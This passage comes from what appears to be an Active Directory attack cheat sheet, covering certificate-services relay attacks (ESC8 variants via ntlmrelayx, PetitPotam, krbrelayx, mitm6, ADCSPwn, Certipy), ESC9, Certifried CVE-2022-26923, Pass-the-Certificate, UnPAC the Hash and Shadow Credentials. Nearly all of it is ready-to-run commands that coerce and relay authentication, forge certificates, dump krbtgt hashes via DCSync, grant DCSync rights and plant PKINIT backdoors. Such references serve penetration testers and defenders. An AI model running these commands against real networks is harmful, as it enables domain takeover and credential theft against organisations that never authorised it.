<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>impacket&gt; python3 ntlmrelayx.py -t http<span style="color:#960050;background-color:#1e0010">:</span>//&lt;ca-server&gt;/certsrv/certfnsh.asp -smb2support --adcs
</span></span><span style="display:flex;"><span>impacket&gt; python3 ./examples/ntlmrelayx.py -t http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.10.<span style="color:#ae81ff">10</span>/certsrv/certfnsh.asp -smb2support --adcs --template VulnTemplate
</span></span><span style="display:flex;"><span><span style="color:#75715e"># For a member server or workstation, the template would be &#34;Computer&#34;.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Other templates: workstation, DomainController, Machine, KerberosAuthentication</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># You can also use any other way to coerce the authentication like PrintSpooler via MS-RPRN</span>
</span></span><span style="display:flex;"><span>git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/topotam/PetitPotam
</span></span><span style="display:flex;"><span>python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
</span></span><span style="display:flex;"><span>python3 petitpotam.py -d <span style="color:#e6db74">&#39;&#39;</span> -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> $ATTACKER_IP $TARGET_IP
</span></span><span style="display:flex;"><span>python3 dementor.py &lt;listener&gt; &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -d &lt;domain&gt;
</span></span><span style="display:flex;"><span>python3 dementor.py <span style="color:#ae81ff">10.10</span>.10.250 <span style="color:#ae81ff">10.10</span>.10.10 -u user1 -p Password1 -d lab.local
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Use the certificate with rubeus to request a TGT</span>
</span></span><span style="display:flex;"><span>Rubeus.exe asktgt /user<span style="color:#960050;background-color:#1e0010">:</span>&lt;user&gt; /certificate<span style="color:#960050;background-color:#1e0010">:</span>&lt;base64-certificate&gt; /ptt
</span></span><span style="display:flex;"><span>Rubeus.exe asktgt /user<span style="color:#960050;background-color:#1e0010">:</span>dc1$ /certificate<span style="color:#960050;background-color:#1e0010">:</span>MIIRdQIBAzC...mUUXS /ptt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Now you can use the TGT to perform a DCSync</span>
</span></span><span style="display:flex;"><span>mimikatz&gt; lsadump::dcsync /user<span style="color:#960050;background-color:#1e0010">:</span>krbtgt
</span></span></code></pre></div></li>
<li>
<p><strong>Version 2</strong>: NTLM Relay + Mimikatz + Kekeo</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>impacket&gt; python3 ./examples/ntlmrelayx.py -t http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.10.<span style="color:#ae81ff">10</span>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Mimikatz</span>
</span></span><span style="display:flex;"><span>mimikatz&gt; misc::efs /server<span style="color:#960050;background-color:#1e0010">:</span>dc.lab.local /connect<span style="color:#960050;background-color:#1e0010">:</span>&lt;IP&gt; /noauth
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Kekeo</span>
</span></span><span style="display:flex;"><span>kekeo&gt; base64 /input<span style="color:#960050;background-color:#1e0010">:</span>on
</span></span><span style="display:flex;"><span>kekeo&gt; tgt::ask /pfx<span style="color:#960050;background-color:#1e0010">:</span>&lt;BASE64-CERT-FROM-NTLMRELAY&gt; /user<span style="color:#960050;background-color:#1e0010">:</span>dc$ /domain<span style="color:#960050;background-color:#1e0010">:</span>lab.local /ptt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Mimikatz</span>
</span></span><span style="display:flex;"><span>mimikatz&gt; lsadump::dcsync /user<span style="color:#960050;background-color:#1e0010">:</span>krbtgt
</span></span></code></pre></div></li>
<li>
<p><strong>Version 3</strong>: Kerberos Relay</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Setup the relay</span>
</span></span><span style="display:flex;"><span>sudo krbrelayx.py --target http<span style="color:#960050;background-color:#1e0010">:</span>//CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Run mitm6</span>
</span></span><span style="display:flex;"><span>sudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v
</span></span></code></pre></div></li>
<li>
<p><strong>Version 4</strong>: ADCSPwn - Require <code>WebClient</code> service running on the domain controller. By default this service is not installed.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/bats3c/ADCSPwn
</span></span><span style="display:flex;"><span>adcspwn.exe --adcs &lt;cs server&gt; --port [<span style="color:#66d9ef">local port</span>] --remote [<span style="color:#66d9ef">computer</span>]
</span></span><span style="display:flex;"><span>adcspwn.exe --adcs cs.pwnlab.local
</span></span><span style="display:flex;"><span>adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port <span style="color:#ae81ff">9001</span>
</span></span><span style="display:flex;"><span>adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\Temp\cert_b64.txt
</span></span><span style="display:flex;"><span>adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\mranderson --password The0nly0ne! --dc dc.pwnlab.local
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ADCSPwn arguments</span>
</span></span><span style="display:flex;"><span>adcs            -       This is the address of the AD CS server which authentication will be relayed to.
</span></span><span style="display:flex;"><span>secure          -       Use HTTPS with the certificate service.
</span></span><span style="display:flex;"><span>port            -       The port ADCSPwn will listen on.
</span></span><span style="display:flex;"><span>remote          -       Remote machine to trigger authentication from.
</span></span><span style="display:flex;"><span>username        -       Username <span style="color:#66d9ef">for</span> non-domain context.
</span></span><span style="display:flex;"><span>password        -       Password <span style="color:#66d9ef">for</span> non-domain context.
</span></span><span style="display:flex;"><span>dc              -       Domain controller to query <span style="color:#66d9ef">for</span> Certificate Templates (LDAP).
</span></span><span style="display:flex;"><span>unc             -       Set custom UNC callback path <span style="color:#66d9ef">for</span> EfsRpcOpenFileRaw (Petitpotam) .
</span></span><span style="display:flex;"><span>output          -       Output path to store base64 generated crt.
</span></span></code></pre></div></li>
<li>
<p><strong>Version 5</strong>: Certipy ESC8</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>certipy relay -ca <span style="color:#ae81ff">172.16</span>.19.100
</span></span></code></pre></div></li>
</ul>
<h4 id="esc9---no-security-extension">
  ESC9 - No Security Extension
  <a class="anchor" href="#esc9---no-security-extension">#</a>
</h4>
<p>Requirements:</p>
<ul>
<li><code>StrongCertificateBindingEnforcement</code> set to <code>1</code> (default) or <code>0</code></li>
<li>Certificate contains the <code>CT_FLAG_NO_SECURITY_EXTENSION</code> flag in the <code>msPKI-Enrollment-Flag</code> value</li>
<li>Certificate specifies <code>Any Client</code> authentication EKU</li>
<li><code>GenericWrite</code> over any account A to compromise any account B</li>
</ul>
<p><strong>Scenario</strong></p>
<p><a href="mailto:John@corp.local">John@corp.local</a> has <strong>GenericWrite</strong> over <a href="mailto:Jane@corp.local">Jane@corp.local</a>, and we want to compromise <a href="mailto:Administrator@corp.local">Administrator@corp.local</a>.
<a href="mailto:Jane@corp.local">Jane@corp.local</a> is allowed to enroll in the certificate template ESC9 that specifies the <strong>CT_FLAG_NO_SECURITY_EXTENSION</strong> flag in the <strong>msPKI-Enrollment-Flag</strong> value.</p>
<ul>
<li>Obtain the hash of Jane with Shadow Credentials (using our GenericWrite)
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>certipy shadow auto -username John@corp.local -p Passw0rd -account Jane
</span></span></code></pre></div></li>
<li>Change the <strong>userPrincipalName</strong> of Jane to be Administrator. :warning: leave the <code>@corp.local</code> part
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>certipy account update -username John@corp.local -password Passw0rd -user Jane -upn Administrator
</span></span></code></pre></div></li>
<li>Request the vulnerable certificate template ESC9 from Jane&rsquo;s account.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>certipy req -username jane@corp.local -hashes ... -ca corp-DC-CA -template ESC9
</span></span><span style="display:flex;"><span><span style="color:#75715e"># userPrincipalName in the certificate is Administrator </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># the issued certificate contains no &#34;object SID&#34;</span>
</span></span></code></pre></div></li>
<li>Restore userPrincipalName of Jane to <a href="mailto:Jane@corp.local">Jane@corp.local</a>.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>certipy account update -username John@corp.local -password Passw0rd -user Jane@corp.local
</span></span></code></pre></div></li>
<li>Authenticate with the certificate and receive the NT hash of the <a href="mailto:Administrator@corp.local">Administrator@corp.local</a> user.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>certipy auth -pfx administrator.pfx -domain corp.local
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Add -domain &lt;domain&gt; to your command line since there is no domain specified in the certificate.</span>
</span></span></code></pre></div></li>
</ul>
<h4 id="certifried-cve-2022-26923">
  Certifried CVE-2022-26923
  <a class="anchor" href="#certifried-cve-2022-26923">#</a>
</h4>
<blockquote>
<p>An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege.</p>
</blockquote>
<ul>
<li>Find <code>ms-DS-MachineAccountQuota</code>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>python bloodyAD.py -d lab.local -u username -p <span style="color:#e6db74">&#39;Password123*&#39;</span> --host <span style="color:#ae81ff">10.10</span>.10.10 getObjectAttributes  <span style="color:#e6db74">&#39;DC=lab,DC=local&#39;</span> ms-DS-MachineAccountQuota 
</span></span></code></pre></div></li>
<li>Add a new computer in the Active Directory, by default <code>MachineAccountQuota = 10</code>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>python bloodyAD.py -d lab.local -u username -p <span style="color:#e6db74">&#39;Password123*&#39;</span> --host <span style="color:#ae81ff">10.10</span>.10.10 addComputer cve <span style="color:#e6db74">&#39;CVEPassword1234*&#39;</span>
</span></span><span style="display:flex;"><span>certipy account create <span style="color:#e6db74">&#39;lab.local/username:Password123*@dc.lab.local&#39;</span> -user <span style="color:#e6db74">&#39;cve&#39;</span> -dns <span style="color:#e6db74">&#39;dc.lab.local&#39;</span>
</span></span></code></pre></div></li>
<li>[ALTERNATIVE] If you are <code>SYSTEM</code> and the <code>MachineAccountQuota=0</code>: Use a ticket for the current machine and reset its SPN
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Rubeus.exe tgtdeleg
</span></span><span style="display:flex;"><span>export KRB5CCNAME=/tmp/ws02.ccache
</span></span><span style="display:flex;"><span>python bloodyAD -d lab.local -u <span style="color:#e6db74">&#39;ws02$&#39;</span> -k --host dc.lab.local setAttribute <span style="color:#e6db74">&#39;CN=ws02,CN=Computers,DC=lab,DC=local&#39;</span> servicePrincipalName <span style="color:#e6db74">&#39;[]&#39;</span>
</span></span></code></pre></div></li>
<li>Set the <code>dNSHostName</code> attribute to match the Domain Controller hostname
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>python bloodyAD.py -d lab.local -u username -p <span style="color:#e6db74">&#39;Password123*&#39;</span> --host <span style="color:#ae81ff">10.10</span>.10.10 setAttribute <span style="color:#e6db74">&#39;CN=cve,CN=Computers,DC=lab,DC=local&#39;</span> dNSHostName <span style="color:#e6db74">&#39;[&#34;DC.lab.local&#34;]&#39;</span>
</span></span><span style="display:flex;"><span>python bloodyAD.py -d lab.local -u username -p <span style="color:#e6db74">&#39;Password123*&#39;</span> --host <span style="color:#ae81ff">10.10</span>.10.10 getObjectAttributes <span style="color:#e6db74">&#39;CN=cve,CN=Computers,DC=lab,DC=local&#39;</span> dNSHostName
</span></span></code></pre></div></li>
<li>Request a ticket
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># certipy req &#39;domain.local/cve$:CVEPassword1234*@ADCS_IP&#39; -template Machine -dc-ip DC_IP -ca discovered-CA</span>
</span></span><span style="display:flex;"><span>certipy req <span style="color:#e6db74">&#39;lab.local/cve$:CVEPassword1234*@10.100.10.13&#39;</span> -template Machine -dc-ip <span style="color:#ae81ff">10.10</span>.10.10 -ca lab-ADCS-CA
</span></span></code></pre></div></li>
<li>Either use the pfx or set a RBCD on your machine account to takeover the domain
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>certipy auth -pfx ./dc.pfx -dc-ip <span style="color:#ae81ff">10.10</span>.10.10
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>openssl pkcs12 -in dc.pfx -out dc.pem -nodes
</span></span><span style="display:flex;"><span>python bloodyAD.py -d lab.local  -c <span style="color:#e6db74">&#34;:dc.pem&#34;</span> -u <span style="color:#e6db74">&#39;cve$&#39;</span> --host <span style="color:#ae81ff">10.10</span>.10.10 setRbcd <span style="color:#e6db74">&#39;CVE$&#39;</span> <span style="color:#e6db74">&#39;CRASHDC$&#39;</span>
</span></span><span style="display:flex;"><span>getST.py -spn LDAP/CRASHDC.lab.local -impersonate Administrator -dc-ip <span style="color:#ae81ff">10.10</span>.10.10 <span style="color:#e6db74">&#39;lab.local/cve$:CVEPassword1234*&#39;</span>   
</span></span><span style="display:flex;"><span>secretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt <span style="color:#e6db74">&#39;lab.local/Administrator@dc.lab.local&#39;</span> -k -no-pass -dc-ip <span style="color:#ae81ff">10.10</span>.10.10 -target-ip <span style="color:#ae81ff">10.10</span>.10.10 
</span></span></code></pre></div></li>
</ul>
<h4 id="pass-the-certificate">
  Pass-The-Certificate
  <a class="anchor" href="#pass-the-certificate">#</a>
</h4>
<blockquote>
<p>Pass the Certificate in order to get a TGT, this technique is used in &ldquo;UnPAC the Hash&rdquo; and &ldquo;Shadow Credential&rdquo;</p>
</blockquote>
<ul>
<li>Windows
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Information about a cert file</span>
</span></span><span style="display:flex;"><span>certutil -v -dump admin.pfx
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># From a Base64 PFX</span>
</span></span><span style="display:flex;"><span>Rubeus.exe asktgt /user<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;TARGET_SAMNAME&#34;</span> /certificate<span style="color:#960050;background-color:#1e0010">:</span>cert.pfx /password<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;CERTIFICATE_PASSWORD&#34;</span> /domain<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;FQDN_DOMAIN&#34;</span> /dc<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;DOMAIN_CONTROLLER&#34;</span> /show
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Grant DCSync rights to an user</span>
</span></span><span style="display:flex;"><span>./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target <span style="color:#e6db74">&#34;DC=domain,DC=local&#34;</span> --sid &lt;user_SID&gt;
</span></span><span style="display:flex;"><span><span style="color:#75715e"># To restore</span>
</span></span><span style="display:flex;"><span>./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target <span style="color:#e6db74">&#34;DC=domain,DC=local&#34;</span> --restore restoration_file.txt
</span></span></code></pre></div></li>
<li>Linux
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Base64-encoded PFX certificate (string) (password can be set)</span>
</span></span><span style="display:flex;"><span>gettgtpkinit.py -pfx-base64 $(cat <span style="color:#e6db74">&#34;PATH_TO_B64_PFX_CERT&#34;</span>) <span style="color:#e6db74">&#34;FQDN_DOMAIN/TARGET_SAMNAME&#34;</span> <span style="color:#e6db74">&#34;TGT_CCACHE_FILE&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># PEM certificate (file) + PEM private key (file)</span>
</span></span><span style="display:flex;"><span>gettgtpkinit.py -cert-pem <span style="color:#e6db74">&#34;PATH_TO_PEM_CERT&#34;</span> -key-pem <span style="color:#e6db74">&#34;PATH_TO_PEM_KEY&#34;</span> <span style="color:#e6db74">&#34;FQDN_DOMAIN/TARGET_SAMNAME&#34;</span> <span style="color:#e6db74">&#34;TGT_CCACHE_FILE&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># PFX certificate (file) + password (string, optionnal)</span>
</span></span><span style="display:flex;"><span>gettgtpkinit.py -cert-pfx <span style="color:#e6db74">&#34;PATH_TO_PFX_CERT&#34;</span> -pfx-pass <span style="color:#e6db74">&#34;CERT_PASSWORD&#34;</span> <span style="color:#e6db74">&#34;FQDN_DOMAIN/TARGET_SAMNAME&#34;</span> <span style="color:#e6db74">&#34;TGT_CCACHE_FILE&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Using Certipy</span>
</span></span><span style="display:flex;"><span>certipy auth -pfx <span style="color:#e6db74">&#34;PATH_TO_PFX_CERT&#34;</span> -dc-ip <span style="color:#e6db74">&#39;dc-ip&#39;</span> -username <span style="color:#e6db74">&#39;user&#39;</span> -domain <span style="color:#e6db74">&#39;domain&#39;</span>
</span></span><span style="display:flex;"><span>certipy cert -export -pfx <span style="color:#e6db74">&#34;PATH_TO_PFX_CERT&#34;</span> -password <span style="color:#e6db74">&#34;CERT_PASSWORD&#34;</span> -out <span style="color:#e6db74">&#34;unprotected.pfx&#34;</span>
</span></span></code></pre></div></li>
</ul>
<h3 id="unpac-the-hash">
  UnPAC The Hash
  <a class="anchor" href="#unpac-the-hash">#</a>
</h3>
<p>Using the <strong>UnPAC The Hash</strong> method, you can retrieve the NT Hash for an User via its certificate.</p>
<ul>
<li>Windows
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC.</span>
</span></span><span style="display:flex;"><span>Rubeus.exe asktgt /getcredentials /user<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;TARGET_SAMNAME&#34;</span> /certificate<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;BASE64_CERTIFICATE&#34;</span> /password<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;CERTIFICATE_PASSWORD&#34;</span> /domain<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;FQDN_DOMAIN&#34;</span> /dc<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;DOMAIN_CONTROLLER&#34;</span> /show
</span></span></code></pre></div></li>
<li>Linux
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Obtain a TGT by validating a PKINIT pre-authentication</span>
</span></span><span style="display:flex;"><span>$ gettgtpkinit.py -cert-pfx <span style="color:#e6db74">&#34;PATH_TO_CERTIFICATE&#34;</span> -pfx-pass <span style="color:#e6db74">&#34;CERTIFICATE_PASSWORD&#34;</span> <span style="color:#e6db74">&#34;FQDN_DOMAIN/TARGET_SAMNAME&#34;</span> <span style="color:#e6db74">&#34;TGT_CCACHE_FILE&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Use the session key to recover the NT hash</span>
</span></span><span style="display:flex;"><span>$ export KRB5CCNAME=<span style="color:#e6db74">&#34;TGT_CCACHE_FILE&#34;</span> getnthash.py -key <span style="color:#e6db74">&#39;AS-REP encryption key&#39;</span> <span style="color:#e6db74">&#39;FQDN_DOMAIN&#39;</span>/<span style="color:#e6db74">&#39;TARGET_SAMNAME&#39;</span>
</span></span></code></pre></div></li>
</ul>
<h3 id="shadow-credentials">
  Shadow Credentials
  <a class="anchor" href="#shadow-credentials">#</a>
</h3>
<blockquote>
<p>Add <strong>Key Credentials</strong> to the attribute <code>msDS-KeyCredentialLink</code> of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user.  When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match.</p>
</blockquote>
<p>:warning: User objects can&rsquo;t edit their own <code>msDS-KeyCredentialLink</code> attribute while computer objects can. Computer objects can edit their own msDS-KeyCredentialLink attribute but can only add a KeyCredential if none already exists</p>
<p><strong>Requirements</strong>:</p>
<ul>
<li>Domain Controller on (at least) Windows Server 2016</li>
<li>Domain must have Active Directory <code>Certificate Services</code> and <code>Certificate Authority</code> configured</li>
<li>PKINIT Kerberos authentication</li>
<li>An account with the delegated rights to write to the <code>msDS-KeyCredentialLink</code> attribute of the target object</li>
</ul>
<p><strong>Exploitation</strong>:</p>
<ul>
<li>
<p>From Windows, use <a href="https://github.com/eladshamir/Whisker">Whisker</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.</span>
</span></span><span style="display:flex;"><span>Whisker.exe list /target<span style="color:#960050;background-color:#1e0010">:</span>computername$
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.</span>
</span></span><span style="display:flex;"><span>Whisker.exe add /target<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;TARGET_SAMNAME&#34;</span> /domain<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;FQDN_DOMAIN&#34;</span> /dc<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;DOMAIN_CONTROLLER&#34;</span> /path<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;cert.pfx&#34;</span> /password<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;pfx-password&#34;</span>
</span></span><span style="display:flex;"><span>Whisker.exe add /target<span style="color:#960050;background-color:#1e0010">:</span>computername$ [/domain<span style="color:#960050;background-color:#1e0010">:</span>constoso.local /dc<span style="color:#960050;background-color:#1e0010">:</span>dc1.contoso.local /path<span style="color:#960050;background-color:#1e0010">:</span>C:\path\to\file.pfx /password<span style="color:#960050;background-color:#1e0010">:</span>P@ssword1]
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Removes a key credential from the target object specified by a DeviceID GUID.</span>
</span></span><span style="display:flex;"><span>Whisker.exe remove /target<span style="color:#960050;background-color:#1e0010">:</span>computername$ /domain<span style="color:#960050;background-color:#1e0010">:</span>constoso.local /dc<span style="color:#960050;background-color:#1e0010">:</span>dc1.contoso.local /remove<span style="color:#960050;background-color:#1e0010">:</span>2de4643a-2e0b-<span style="color:#ae81ff">438f</span>-a99d-5cb058b3254b
</span></span></code></pre></div></li>
<li>
<p>From Linux, use <a href="https://github.com/ShutdownRepo/pyWhisker">pyWhisker</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.</span>
</span></span><span style="display:flex;"><span>python3 pywhisker.py -d <span style="color:#e6db74">&#34;domain.local&#34;</span> -u <span style="color:#e6db74">&#34;user1&#34;</span> -p <span style="color:#e6db74">&#34;complexpassword&#34;</span> --target <span style="color:#e6db74">&#34;user2&#34;</span> --action <span style="color:#e6db74">&#34;list&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.</span>
</span></span><span style="display:flex;"><span>pywhisker.py -d <span style="color:#e6db74">&#34;FQDN_DOMAIN&#34;</span> -u <span style="color:#e6db74">&#34;user1&#34;</span> -p <span style="color:#e6db74">&#34;CERTIFICATE_PASSWORD&#34;</span> --target <span style="color:#e6db74">&#34;TARGET_SAMNAME&#34;</span> --action <span style="color:#e6db74">&#34;list&#34;</span>
</span></span><span style="display:flex;"><span>python3 pywhisker.py -d <span style="color:#e6db74">&#34;domain.local&#34;</span> -u <span style="color:#e6db74">&#34;user1&#34;</span> -p <span style="color:#e6db74">&#34;complexpassword&#34;</span> --target <span style="color:#e6db74">&#34;user2&#34;</span> --action <span style="color:#e6db74">&#34;add&#34;</span> --filename <span style="color:#e6db74">&#34;test1&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Removes a key credential from the target object specified by a DeviceID GUID.</span>
</span></span><span style="display:flex;"><span>python3 pywhisker.py -d <span style="color:#e6db74">&#34;domain.local&#34;</span> -u <span style="color:#e6db74">&#34;user1&#34;</span> -p <span style="color:#e6db74">&#34;complexpassword&#34;</span> --target <span style="color:#e6db74">&#34;user2&#34;</span> --action <span style="color:#e6db74">&#34;remove&#34;</span> --device-id <span style="color:#e6db74">&#34;a8ce856e-9b58-61f9-8fd3-b079689eb46e&#34;</span>
</span></span></code></pre></div></li>
</ul>
<p><strong>Scenario</strong>:</p>
<ul>
<li>
<p><strong>Scenario 1</strong>: Shadow Credential relaying</p>
<ul>
<li>Trigger an NTLM authentication from <code>DC01</code> (PetitPotam)</li>
<li>Relay it to <code>DC02</code> (ntlmrelayx)</li>
<li>Edit <code>DC01</code>&rsquo;s attribute to create a Kerberos PKINIT pre-authentication backdoor (pywhisker)</li>
<li>Alternatively : <code>ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'</code></li>
</ul>
</li>
<li>
<p><strong>Scenario 2</strong>: Workstation Takeover with RBCD</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Only for C2: Add Reverse Port Forward from 8081 to Team Server 81</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set up ntlmrelayx to relay authentication from target workstation to DC </span>
